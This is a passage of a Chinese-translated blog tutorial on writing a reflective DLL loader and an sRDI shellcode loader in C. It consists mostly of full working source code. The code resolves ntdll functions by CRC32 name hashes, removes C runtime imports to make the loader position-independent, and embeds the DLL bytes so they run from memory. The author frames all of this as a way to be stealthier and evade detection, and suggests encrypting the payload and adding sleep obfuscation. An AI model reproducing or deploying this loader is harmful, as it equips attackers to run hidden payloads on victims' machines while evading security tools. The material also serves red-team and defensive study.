    #define NtClose_CRC32b                      0xf78fd98f
    #define NtAllocateVirtualMemory_CRC32b      0xec50426f
    #define NtReadVirtualMemory_CRC32b          0x58bdb7be
    #define NtFreeVirtualMemory_CRC32b          0xf29625d3
    #define NtProtectVirtualMemory_CRC32b       0x357d60b3
    #define NtFlushInstructionCache_CRC32b      0xc5f7ca5e
    #define NtQueryInformationFile_CRC32b       0xb54956cb
    
    extern void *get_ntdll();
    
    uint32_t crc32b(const uint8_t *str);
    
    void *get_proc_address_by_hash(void *dll_address, uint32_t function_hash);
    

main.c

    
    
    #include <stdio.h>
    #include "peb.h"
    
    int main() {
    
        NTSTATUS status;
        UNICODE_STRING dll_file;
        WCHAR w_file_path[100] = L"\\??\\\\C:\\Temp\\dll_poc.dll";
        void *p_ntdll = get_ntdll();
        void *p_rtl_init_unicode_string = get_proc_address_by_hash(p_ntdll, RtlInitUnicodeString_CRC32b);
        RtlInitUnicodeString_t g_rtl_init_unicode_string = (RtlInitUnicodeString_t) p_rtl_init_unicode_string;
        g_rtl_init_unicode_string(&dll_file, w_file_path);
    
        OBJECT_ATTRIBUTES obj_attrs;
        IO_STATUS_BLOCK io_status_block;
        InitializeObjectAttributes(&obj_attrs, &dll_file, OBJ_CASE_INSENSITIVE, NULL, NULL);
    
        HANDLE h_file = NULL;
        void *p_nt_create_file = get_proc_address_by_hash(p_ntdll, NtCreateFile_CRC32b);
        NtCreateFile_t g_nt_create_file = (NtCreateFile_t) p_nt_create_file;
        if((status = g_nt_create_file(&h_file, SYNCHRONIZE | GENERIC_READ, &obj_attrs, &io_status_block, 0, 0x0000080, 0x0000007, FILE_OPEN_IF, 0x0000020, 0x0000000, 0)) != 0x0)
            return -1;
    
        FILE_STANDARD_INFORMATION file_standard_info;
        void *p_nt_query_information_file = get_proc_address_by_hash(p_ntdll, NtQueryInformationFile_CRC32b);
        NtQueryInformationFile_t g_nt_query_information_file = (NtQueryInformationFile_t) p_nt_query_information_file;
        if((status = g_nt_query_information_file(h_file, &io_status_block, &file_standard_info, sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation)) != 0x0)
            return -2;
    
        unsigned long long int dll_size = file_standard_info.EndOfFile.QuadPart;
        void *dll_bytes = NULL;
        void *p_nt_allocate_virtual_memory = get_proc_address_by_hash(p_ntdll, NtAllocateVirtualMemory_CRC32b);
        NtAllocateVirtualMemory_t g_nt_allocate_virtual_memory = (NtAllocateVirtualMemory_t) p_nt_allocate_virtual_memory;
        if((status = g_nt_allocate_virtual_memory(((HANDLE) -1), &dll_bytes, 0, &dll_size, MEM_COMMIT, PAGE_READWRITE)) != 0x0)
            return -3;
    
        void *p_nt_read_file = get_proc_address_by_hash(p_ntdll, NtReadFile_CRC32b);
        NtReadFile_t g_nt_read_file = (NtReadFile_t)p_nt_read_file;
        if((status = g_nt_read_file(h_file, NULL, NULL, NULL, &io_status_block, dll_bytes, dll_size, 0, NULL)) != 0x0)
            return -4;
    
        PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)dll_bytes;
        PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((unsigned long long int)dll_bytes + dos_header->e_lfanew);
        SIZE_T dll_image_size = nt_headers->OptionalHeader.SizeOfImage;
    
        void *dll_base = NULL;
        if((status = g_nt_allocate_virtual_memory(NtCurrentProcess(), &dll_base, 0, &dll_image_size, MEM_COMMIT, PAGE_READWRITE)) != 0x0)
            return -4;
    
        unsigned long long int delta_image_base = (unsigned long long int)dll_base - (unsigned long long int)nt_headers->OptionalHeader.ImageBase;
        memcpy(dll_base, dll_bytes, nt_headers->OptionalHeader.SizeOfHeaders);
    
        PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt_headers);
        for(size_t i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
            void *section_destination = (LPVOID)((unsigned long long int)dll_base + (unsigned long long int)section->VirtualAddress);
            void *section_bytes = (LPVOID)((unsigned long long int)dll_bytes + (unsigned long long int)section->PointerToRawData);
            memcpy(section_destination, section_bytes, section->SizeOfRawData);
            section++;
        }
    
        IMAGE_DATA_DIRECTORY relocations = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        unsigned long long int relocation_table = relocations.VirtualAddress + (unsigned long long int)dll_base;
        unsigned long relocations_processed = 0;
    
        while(relocations_processed < relocations.Size) {
            PBASE_RELOCATION_BLOCK relocation_block = (PBASE_RELOCATION_BLOCK)(relocation_table + relocations_processed);
            relocations_processed += sizeof(BASE_RELOCATION_BLOCK);
            unsigned long relocations_count = (relocation_block->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
            PBASE_RELOCATION_ENTRY relocation_entries = (PBASE_RELOCATION_ENTRY)(relocation_table + relocations_processed);
    
            for(unsigned long i = 0; i < relocations_count; i++) {
                relocations_processed += sizeof(BASE_RELOCATION_ENTRY);
                if(relocation_entries[i].Type == 0)
                    continue;
    
                unsigned long long int relocation_rva = relocation_block->PageAddress + relocation_entries[i].Offset;
                unsigned long long int address_to_patch = 0;
                void *p_nt_read_virtual_memory = get_proc_address_by_hash(p_ntdll, NtReadVirtualMemory_CRC32b);
                NtReadVirtualMemory_t g_nt_read_virtual_memory = (NtReadVirtualMemory_t) p_nt_read_virtual_memory;
                if((status = g_nt_read_virtual_memory(NtCurrentProcess(), (void *)((unsigned long long int)dll_base + relocation_rva), &address_to_patch, sizeof(unsigned long long int), NULL)) != 0x0)
                    return -5;
    
                address_to_patch += delta_image_base;
                memcpy((void *)((unsigned long long int)dll_base + relocation_rva), &address_to_patch, sizeof(unsigned long long int));
            }
        }
    
        PIMAGE_IMPORT_DESCRIPTOR import_descriptor;
        IMAGE_DATA_DIRECTORY images_directory = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
        UNICODE_STRING import_library_name;
    
        import_descriptor = (PIMAGE_IMPORT_DESCRIPTOR)(images_directory.VirtualAddress + (unsigned long long int)dll_base);
        void *current_library = NULL;
    
        while(import_descriptor->Name != 0) {
            void *p_ldr_load_dll = get_proc_address_by_hash(p_ntdll, LdrLoadDll_CRC32b);
            char *module_name = (char *)dll_base + import_descriptor->Name;
            wchar_t w_module_name[MAX_PATH];
            unsigned long num_converted;
    
            void *p_rtl_multi_byte_to_unicode_n = get_proc_address_by_hash(p_ntdll, RtlMultiByteToUnicodeN_CRC32b);
            RtlMultiByteToUnicodeN_t g_rtl_multi_byte_to_unicode_n = (RtlMultiByteToUnicodeN_t) p_rtl_multi_byte_to_unicode_n;
            if((status = g_rtl_multi_byte_to_unicode_n(w_module_name, sizeof(w_module_name), &num_converted, module_name, strlen(module_name) +1)) != 0x0)
                return -5;
    
            g_rtl_init_unicode_string(&import_library_name, w_module_name);
            LdrLoadDll_t g_ldr_load_dll = (LdrLoadDll_t) p_ldr_load_dll;
            if((status = g_ldr_load_dll(NULL, NULL, &import_library_name, &current_library)) != 0x0)
                return -6;
    
            if (current_library){
                ANSI_STRING a_string;
                PIMAGE_THUNK_DATA thunk = NULL;
                PIMAGE_THUNK_DATA original_thunk = NULL;
                thunk = (PIMAGE_THUNK_DATA)((unsigned long long int)dll_base + import_descriptor->FirstThunk);
                original_thunk = (PIMAGE_THUNK_DATA)((unsigned long long int)dll_base + import_descriptor->OriginalFirstThunk);
                while (thunk->u1.AddressOfData != 0){
                    void *p_ldr_get_procedure_address = get_proc_address_by_hash(p_ntdll, LdrGetProcedureAddress_CRC32b);
                    LdrGetProcedureAddress_t g_ldr_get_procedure_address = (LdrGetProcedureAddress_t) p_ldr_get_procedure_address;
                    if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal)) {
                        g_ldr_get_procedure_address(current_library, NULL, (WORD) original_thunk->u1.Ordinal, (PVOID *) &(thunk->u1.Function));
                    } else {
                        PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((unsigned long long int)dll_base + thunk->u1.AddressOfData);
                        FILL_STRING(a_string, functionName->Name);
                        g_ldr_get_procedure_address(current_library, &a_string, 0, (PVOID *) &(thunk->u1.Function));
                    }
                    ++thunk;
                    ++original_thunk;
                }
            }
            import_descriptor++;
        }
    
        PIMAGE_SECTION_HEADER section_header = IMAGE_FIRST_SECTION(nt_headers);
        for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++, section_header++) {
            if (section_header->SizeOfRawData) {
                unsigned long executable = (section_header->Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
                unsigned long readable = (section_header->Characteristics & IMAGE_SCN_MEM_READ) != 0;
                unsigned long writeable = (section_header->Characteristics & IMAGE_SCN_MEM_WRITE) != 0;
                unsigned long protect = 0;
    
                if (!executable && !readable && !writeable)
                    protect = PAGE_NOACCESS;
                else if (!executable && !readable && writeable)
                    protect = PAGE_WRITECOPY;
                else if (!executable && readable && !writeable)
                    protect = PAGE_READONLY;
                else if (!executable && readable && writeable)
                    protect = PAGE_READWRITE;
                else if (executable && !readable && !writeable)
                    protect = PAGE_EXECUTE;
                else if (executable && !readable && writeable)
                    protect = PAGE_EXECUTE_WRITECOPY;
                else if (executable && readable && !writeable)
                    protect = PAGE_EXECUTE_READ;
                else if (executable && readable && writeable)
                    protect = PAGE_EXECUTE_READWRITE;
    
                if (section_header->Characteristics & IMAGE_SCN_MEM_NOT_CACHED)
                    protect |= PAGE_NOCACHE;
    
                void *p_nt_protect_virtual_memory = get_proc_address_by_hash(p_ntdll, NtProtectVirtualMemory_CRC32b);
                NtProtectVirtualMemory_t g_nt_protect_virtual_memory = (NtProtectVirtualMemory_t) p_nt_protect_virtual_memory;
                size_t size = section_header->SizeOfRawData;
                void *address = dll_base + section_header->VirtualAddress;
                if((status = g_nt_protect_virtual_memory(NtCurrentProcess(), &address, &size, protect, &protect)) != 0x0)
                    return -7;
            }
        }
    
        void *p_nt_flush_instruction_cache = get_proc_address_by_hash(p_ntdll, NtFlushInstructionCache_CRC32b);
        NtFlushInstructionCache_t g_nt_flush_instruction_cache = (NtFlushInstructionCache_t) p_nt_flush_instruction_cache;
        g_nt_flush_instruction_cache((HANDLE) -1, NULL, 0);
    
        PIMAGE_TLS_CALLBACK *callback;
        PIMAGE_DATA_DIRECTORY tls_entry = &nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
        if(tls_entry->Size) {
            PIMAGE_TLS_DIRECTORY tls_dir = (PIMAGE_TLS_DIRECTORY)((unsigned long long int)dll_base + tls_entry->VirtualAddress);
            callback = (PIMAGE_TLS_CALLBACK *)(tls_dir->AddressOfCallBacks);
            for(; *callback; callback++)
                (*callback)((LPVOID)dll_base, DLL_PROCESS_ATTACH, NULL);
        }
    
        DLLEntry DllEntry = (DLLEntry)((unsigned long long int)dll_base + nt_headers->OptionalHeader.AddressOfEntryPoint);
        (*DllEntry)((HINSTANCE)dll_base, DLL_PROCESS_ATTACH, 0);
    
        void *p_nt_close = get_proc_address_by_hash(p_ntdll, NtClose_CRC32b);
        NtClose_t g_nt_close = (NtClose_t) p_nt_close;
        g_nt_close(h_file);
    
        void *p_nt_free_virtual_memory = get_proc_address_by_hash(p_ntdll, NtFreeVirtualMemory_CRC32b);
        NtFreeVirtualMemory_t g_nt_free_virtual_memory = (NtFreeVirtualMemory_t)p_nt_free_virtual_memory;
        g_nt_free_virtual_memory(((HANDLE) -1), &dll_bytes, &dll_size, MEM_RELEASE);
    
        return 0;
    }
    

CMakeLists.txt

    
    
    cmake_minimum_required(VERSION 3.24)
    project(dll_loader C)
    
    set(CMAKE_C_STANDARD 17)
    set(MASM_NAMES src/masm/peb)
    
    include_directories(${CMAKE_SOURCE_DIR}/src/h)
    
    FOREACH(src ${MASM_NAMES})
        SET(MASM_SRC ${CMAKE_CURRENT_SOURCE_DIR}/${src}.masm)
        SET(MASM_OBJ ${CMAKE_CURRENT_BINARY_DIR}/${src}.obj)
        ADD_CUSTOM_COMMAND(
                OUTPUT ${MASM_OBJ}
                COMMAND C:/Temp/ml64.exe /c /Fo${MASM_OBJ} ${MASM_SRC}
                DEPENDS ${MASM_SRC}
                COMMENT "Assembling ${MASM_SRC}")
        SET(MASM_OBJECTS ${MASM_OBJECTS} ${MASM_OBJ})
    ENDFOREACH(src)
    
    add_executable(dll_loader ${MASM_OBJECTS} main.c src/c/peb.c)

当你重写了以上所有代码后,应该能够构建和执行它,以获取用于验证它是否有效的消息框。

![](./img/4970336566569515901.png)  
现在我们知道逻辑是有效的,让我们更仔细地查看二进制文件,首先从下面所示的Process Hacker开始。

![](./img/1909536282950721632.png)  
正如你所看到的,不再有RWX内存区域,这正是我们希望通过将每个节更新为正确权限而实现的(如上面第6步所示)。 接下来,让我们使用CFF
Explorer打开二进制文件以检查导入表。

![](./img/7835078176902616978.png)  
虽然导入表看起来已经改进了,但它还没有达到我们想要的水平。在继续编写我们的sRDI之前,我们必须确保加载器完全是位置无关的。  
为了实现这一点,我们可以完全删除msvcrt.dll依赖项,通过修改CMakeLists.txt包括以下行来实现。

    
    
    target_link_options(dll_loader PRIVATE -static -nostdlib)
    set_target_properties(dll_loader PROPERTIES LINK_FLAGS "-e start")

CMakeLists.txt文件中的上述添加将删除C标准库,并将入口点从main()更改为start()。但是,通过删除msvcrt.dll依赖项将要求我们编写自己的strlen和memcpy函数来替换代码中使用的那些函数。
在main.c文件顶部,我们将添加两个替换函数strlen和memcpy,如下所示。

    
    
    #include <stdio.h>
    #include "peb.h"
    
    void *mc(void* dest, const void* src, size_t n){
        char* d = (char*)dest;
        const char* s = (const char*)src;
        while (n--)
            *d++ = *s++;
        return dest;
    }
    
    size_t sl(const char* str) {
        size_t len = 0;
        while (*str++)
            len++;
        return len;
    }
    
    int start() {
    
        NTSTATUS status;
        UNICODE_STRING dll_file...
    
    
    
    (Continued...)
    

搜索并替换每个memcpy为mc函数,并替换每个strlen为sl函数。
完成这些更改后,重新构建和运行二进制文件以确保其正常工作。验证你是否收到消息框后,尝试再次在CFF Explorer中打开文件。  
Bingo！不需要导入即可运行,并且消息框仍然弹出,显示使用完全位置无关代码加载DLL。现在我们有了一个完全PIC
RDI加载器,请看看如何将其转换为sRDI加载器,以便我们不必依赖于磁盘/网络DLL进行加载,并且我们可以直接从存根加载DLL。  
隐蔽sRDI加载器  
现在我们有了完全位置无关的RDI加载器,可以尝试更改start()中的前几个步骤,以实现从存根加载shellcode而不是打开和读取字节文件。
首先要做的是将DLL文件转换为shellcode,由Hasherezade编写的pe_to_shellcode工具非常适合此PoC。  
<https://github.com/hasherezade/pe_to_shellcode?ref=blog.malicious.group>  
将dll_poc.dll转换为shellcode dll_poc.bin后,你可以使用xxd工具为你创建头文件。

    
    
    xxd -i dll_poc.bin > dll.h
    

然后你只需将dll.h头文件添加到src/h/文件夹中即可。

![](./img/1392741239151694036.png)  
头文件仅包括两个变量dll_bin和dll_bin_len,分别存储dll字节及其大小。
有了新的dll.h头文件,我们可以返回到start()并更改步骤1以使用shellcode而不是磁盘上的DLL文件。使用dll.h头文件,我们的步骤1从35行代码变为几行代码,如下所示。

**替换步骤1**  
在此步骤中,从头部存根读取DLL文件的二进制表示...

    
    
    NTSTATUS status;
    void *dll_bytes = dll_bin;
    

为避免打印所有其他步骤,因为代码几乎相同,我将打印新的main.c,显示当使用sRDI而不是RDI注入时,我们从步骤1中删除了33行代码。还有一些微小的更改,但在查看以下代码时应该很明显。

    
    
    #include <stdio.h>
    #include "peb.h"
    #include "dll.h"
    
    void *mc(void* dest, const void* src, size_t n){
        char* d = (char*)dest;
        const char* s = (const char*)src;
        while (n--)
            *d++ = *s++;
        return dest;
    }
    
    size_t sl(const char* str) {
        size_t len = 0;
        while (*str++)
            len++;
        return len;
    }
    
    int start() {
    
        NTSTATUS status;
    
        void *dll_bytes = dll_bin;
        PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)dll_bytes;
        PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((unsigned long long int)dll_bytes + dos_header->e_lfanew);
        SIZE_T dll_image_size = nt_headers->OptionalHeader.SizeOfImage;
    
        void *dll_base = NULL;
        void *p_ntdll = get_ntdll();
        void *p_nt_allocate_virtual_memory = get_proc_address_by_hash(p_ntdll, NtAllocateVirtualMemory_CRC32b);
        NtAllocateVirtualMemory_t g_nt_allocate_virtual_memory = (NtAllocateVirtualMemory_t) p_nt_allocate_virtual_memory;
        if((status = g_nt_allocate_virtual_memory((HANDLE) -1, &dll_base, 0, &dll_image_size, MEM_COMMIT, PAGE_READWRITE)) != 0x0)
            return -4;
        unsigned long long int delta_image_base = (unsigned long long int)dll_base - (unsigned long long int)nt_headers->OptionalHeader.ImageBase;
        mc(dll_base, dll_bytes, nt_headers->OptionalHeader.SizeOfHeaders);
    
        PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt_headers);
        for(size_t i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
            void *section_destination = (LPVOID)((unsigned long long int)dll_base + (unsigned long long int)section->VirtualAddress);
            void *section_bytes = (LPVOID)((unsigned long long int)dll_bytes + (unsigned long long int)section->PointerToRawData);
            mc(section_destination, section_bytes, section->SizeOfRawData);
            section++;
        }
    
        IMAGE_DATA_DIRECTORY relocations = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        unsigned long long int relocation_table = relocations.VirtualAddress + (unsigned long long int)dll_base;
        unsigned long relocations_processed = 0;
    
        while(relocations_processed < relocations.Size) {
            PBASE_RELOCATION_BLOCK relocation_block = (PBASE_RELOCATION_BLOCK)(relocation_table + relocations_processed);
            relocations_processed += sizeof(BASE_RELOCATION_BLOCK);
            unsigned long relocations_count = (relocation_block->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
            PBASE_RELOCATION_ENTRY relocation_entries = (PBASE_RELOCATION_ENTRY)(relocation_table + relocations_processed);
    
            for(unsigned long i = 0; i < relocations_count; i++) {
                relocations_processed += sizeof(BASE_RELOCATION_ENTRY);
                if(relocation_entries[i].Type == 0)
                    continue;
    
                unsigned long long int relocation_rva = relocation_block->PageAddress + relocation_entries[i].Offset;
                unsigned long long int address_to_patch = 0;
                void *p_nt_read_virtual_memory = get_proc_address_by_hash(p_ntdll, NtReadVirtualMemory_CRC32b);
                NtReadVirtualMemory_t g_nt_read_virtual_memory = (NtReadVirtualMemory_t) p_nt_read_virtual_memory;
                if((status = g_nt_read_virtual_memory(NtCurrentProcess(), (void *)((unsigned long long int)dll_base + relocation_rva), &address_to_patch, sizeof(unsigned long long int), NULL)) != 0x0)
                    return -5;
    
                address_to_patch += delta_image_base;
                mc((void *)((unsigned long long int)dll_base + relocation_rva), &address_to_patch, sizeof(unsigned long long int));
            }
        }
    
        PIMAGE_IMPORT_DESCRIPTOR import_descriptor;
        IMAGE_DATA_DIRECTORY images_directory = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
        UNICODE_STRING import_library_name;
    
        import_descriptor = (PIMAGE_IMPORT_DESCRIPTOR)(images_directory.VirtualAddress + (unsigned long long int)dll_base);
        void *current_library = NULL;
    
        while(import_descriptor->Name != 0) {
            void *p_ldr_load_dll = get_proc_address_by_hash(p_ntdll, LdrLoadDll_CRC32b);
            char *module_name = (char *)dll_base + import_descriptor->Name;
            wchar_t w_module_name[MAX_PATH];
            unsigned long num_converted;
    
            void *p_rtl_multi_byte_to_unicode_n = get_proc_address_by_hash(p_ntdll, RtlMultiByteToUnicodeN_CRC32b);
            RtlMultiByteToUnicodeN_t g_rtl_multi_byte_to_unicode_n = (RtlMultiByteToUnicodeN_t) p_rtl_multi_byte_to_unicode_n;
            if((status = g_rtl_multi_byte_to_unicode_n(w_module_name, sizeof(w_module_name), &num_converted, module_name, sl(module_name) +1)) != 0x0)
                return -5;
    
            void *p_rtl_init_unicode_string = get_proc_address_by_hash(p_ntdll, RtlInitUnicodeString_CRC32b);
            RtlInitUnicodeString_t g_rtl_init_unicode_string = (RtlInitUnicodeString_t) p_rtl_init_unicode_string;
            g_rtl_init_unicode_string(&import_library_name, w_module_name);
            LdrLoadDll_t g_ldr_load_dll = (LdrLoadDll_t) p_ldr_load_dll;
            if((status = g_ldr_load_dll(NULL, NULL, &import_library_name, &current_library)) != 0x0)
                return -6;
    
            if (current_library){
                ANSI_STRING a_string;
                PIMAGE_THUNK_DATA thunk = NULL;
                PIMAGE_THUNK_DATA original_thunk = NULL;
                thunk = (PIMAGE_THUNK_DATA)((unsigned long long int)dll_base + import_descriptor->FirstThunk);
                original_thunk = (PIMAGE_THUNK_DATA)((unsigned long long int)dll_base + import_descriptor->OriginalFirstThunk);
                while (thunk->u1.AddressOfData != 0){
                    void *p_ldr_get_procedure_address = get_proc_address_by_hash(p_ntdll, LdrGetProcedureAddress_CRC32b);
                    LdrGetProcedureAddress_t g_ldr_get_procedure_address = (LdrGetProcedureAddress_t) p_ldr_get_procedure_address;
                    if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal)) {
                        g_ldr_get_procedure_address(current_library, NULL, (WORD) original_thunk->u1.Ordinal, (PVOID *) &(thunk->u1.Function));
                    } else {
                        PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((unsigned long long int)dll_base + thunk->u1.AddressOfData);
                        FILL_STRING(a_string, functionName->Name);
                        g_ldr_get_procedure_address(current_library, &a_string, 0, (PVOID *) &(thunk->u1.Function));
                    }
                    ++thunk;
                    ++original_thunk;
                }
            }
            import_descriptor++;
        }
    
        PIMAGE_SECTION_HEADER section_header = IMAGE_FIRST_SECTION(nt_headers);
        for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++, section_header++) {
            if (section_header->SizeOfRawData) {
                unsigned long executable = (section_header->Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
                unsigned long readable = (section_header->Characteristics & IMAGE_SCN_MEM_READ) != 0;
                unsigned long writeable = (section_header->Characteristics & IMAGE_SCN_MEM_WRITE) != 0;
                unsigned long protect = 0;
    
                if (!executable && !readable && !writeable)
                    protect = PAGE_NOACCESS;
                else if (!executable && !readable && writeable)
                    protect = PAGE_WRITECOPY;
                else if (!executable && readable && !writeable)
                    protect = PAGE_READONLY;
                else if (!executable && readable && writeable)
                    protect = PAGE_READWRITE;
                else if (executable && !readable && !writeable)
                    protect = PAGE_EXECUTE;
                else if (executable && !readable && writeable)
                    protect = PAGE_EXECUTE_WRITECOPY;
                else if (executable && readable && !writeable)
                    protect = PAGE_EXECUTE_READ;
                else if (executable && readable && writeable)
                    protect = PAGE_EXECUTE_READWRITE;
    
                if (section_header->Characteristics & IMAGE_SCN_MEM_NOT_CACHED)
                    protect |= PAGE_NOCACHE;
    
                void *p_nt_protect_virtual_memory = get_proc_address_by_hash(p_ntdll, NtProtectVirtualMemory_CRC32b);
                NtProtectVirtualMemory_t g_nt_protect_virtual_memory = (NtProtectVirtualMemory_t) p_nt_protect_virtual_memory;
                size_t size = section_header->SizeOfRawData;
                void *address = dll_base + section_header->VirtualAddress;
                if((status = g_nt_protect_virtual_memory(NtCurrentProcess(), &address, &size, protect, &protect)) != 0x0)
                    return -7;
            }
        }
    
        void *p_nt_flush_instruction_cache = get_proc_address_by_hash(p_ntdll, NtFlushInstructionCache_CRC32b);
        NtFlushInstructionCache_t g_nt_flush_instruction_cache = (NtFlushInstructionCache_t) p_nt_flush_instruction_cache;
        g_nt_flush_instruction_cache((HANDLE) -1, NULL, 0);
    
        PIMAGE_TLS_CALLBACK *callback;
        PIMAGE_DATA_DIRECTORY tls_entry = &nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
        if(tls_entry->Size) {
            PIMAGE_TLS_DIRECTORY tls_dir = (PIMAGE_TLS_DIRECTORY)((unsigned long long int)dll_base + tls_entry->VirtualAddress);
            callback = (PIMAGE_TLS_CALLBACK *)(tls_dir->AddressOfCallBacks);
            for(; *callback; callback++)
                (*callback)((LPVOID)dll_base, DLL_PROCESS_ATTACH, NULL);
        }
    
        DLLEntry DllEntry = (DLLEntry)((unsigned long long int)dll_base + nt_headers->OptionalHeader.AddressOfEntryPoint);
        (*DllEntry)((HINSTANCE)dll_base, DLL_PROCESS_ATTACH, 0);
    
        void *p_nt_free_virtual_memory = get_proc_address_by_hash(p_ntdll, NtFreeVirtualMemory_CRC32b);
        NtFreeVirtualMemory_t g_nt_free_virtual_memory = (NtFreeVirtualMemory_t)p_nt_free_virtual_memory;
        g_nt_free_virtual_memory(((HANDLE) -1), &dll_bytes, &dll_image_size, MEM_RELEASE);
    
        return 0;
    }
    

然后重新构建并执行加载器,可以看到我们的sRDI能够从头文件加载DLL,而不是从磁盘或网络拉取DLL。

![](./img/7015616528334843378.png)

好了,到此为止我展示代码示例。但是,这段代码仍然有很多优化可以使其更隐蔽和逃避检测,例如在头文件中加密DLL字节,并在执行之前解密...或向DLL本身添加一些睡眠混淆等等...
希望本文能够让你对如何将标准Windows
API转换为Native代码、如何使用函数混淆、函数名称哈希以及如何反射式地将DLL加载到内存中有一个相当好的理解。

翻译来源: <https://blog.malicious.group/writing-your-own-rdi-srdi-loader-using-c-and-asm>

